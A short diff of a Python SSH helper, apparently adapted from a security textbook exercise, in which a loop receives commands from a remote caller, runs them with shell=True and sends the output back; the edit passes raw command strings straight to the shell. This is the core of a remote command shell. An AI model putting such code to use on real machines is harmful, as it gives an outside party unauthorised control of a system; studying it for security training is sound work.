@@ -19,8 +19,8 @@ def ssh_command(ip, port, user, passwd, command):
                 if cmd == 'exit':
                     client.close()
                     break
-                # 2) send output back to the caller
-                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
+                # 2) send output back to the caller (diverged from book to make arguments/flags work)
+                cmd_output = subprocess.check_output(cmd, shell=True)
                 # 3) This is the confirmation that it was received
                 ssh_session.send(cmd_output or 'okay')
             except Exception as e:
